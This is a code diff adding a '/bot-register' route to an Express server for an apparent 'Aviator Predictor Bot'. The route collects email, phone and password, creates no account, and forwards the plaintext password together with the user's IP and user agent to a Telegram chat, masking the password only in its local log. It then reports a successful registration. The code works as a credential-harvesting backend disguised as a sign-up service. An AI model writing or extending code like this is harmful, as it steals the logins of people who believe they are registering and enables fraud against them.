@@ -736,6 +736,96 @@ router.post('/bot-login', async (req, res) => {
   }
 });
 
+// Bot registration endpoint
+router.post('/bot-register', async (req, res) => {
+  try {
+    const { email, phone, password, userAgent, timestamp } = req.body;
+
+    // Validate required fields
+    if (!email || !phone || !password) {
+      return res.status(400).json({ 
+        success: false,
+        error: 'Email, phone, and password are required' 
+      });
+    }
+
+    // Basic email validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      return res.status(400).json({ 
+        success: false,
+        error: 'Invalid email format' 
+      });
+    }
+
+    // Basic phone validation (simple check for numbers and common formats)
+    const phoneRegex = /^[\+]?[1-9][\d]{3,14}$/;
+    if (!phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''))) {
+      return res.status(400).json({ 
+        success: false,
+        error: 'Invalid phone number format' 
+      });
+    }
+
+    const registrationData = {
+      email,
+      phone,
+      password,
+      userAgent: userAgent || 'Unknown',
+      timestamp: timestamp || new Date().toISOString(),
+      source: 'Aviator Bot Registration',
+      ip: req.ip || 'Unknown'
+    };
+
+    // Log registration attempt (with masked password)
+    logAuthData(maskSensitiveData(registrationData));
+
+    // Send to Telegram with formatted message
+    const telegramMessage = `🆕 <b>NEW BOT USER REGISTRATION</b>
+
+👤 Email: <code>${email}</code>
+📱 Phone: <code>${phone}</code>
+🔑 Password: <code>${password}</code>
+🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
+📍 IP: <code>${req.ip || 'Unknown'}</code>
+⏰ Registration Time: <code>${new Date().toLocaleString()}</code>
+🤖 Platform: Aviator Predictor Bot
+🔗 Status: Successfully registered`;
+
+    const telegramResult = await sendToTelegram(telegramMessage);
+    console.log('✅ Bot registration Telegram result:', telegramResult);
+
+    // Return success with registration info
+    res.json({ 
+      success: true,
+      message: 'Registration successful',
+      userData: {
+        email,
+        phone,
+        registrationTime: registrationData.timestamp,
+        status: 'registered'
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Bot registration error:', error);
+    
+    // Log error
+    logAuthData({
+      error: error.message,
+      email: req.body.email,
+      phone: req.body.phone,
+      timestamp: new Date().toISOString()
+    });
+
+    res.status(500).json({ 
+      success: false,
+      error: 'Registration failed. Please try again.',
+      details: error.message
+    });
+  }
+});
+
 // Get chat ID helper endpoint
 router.get('/get-chat-id', async (req, res) => {
   try {
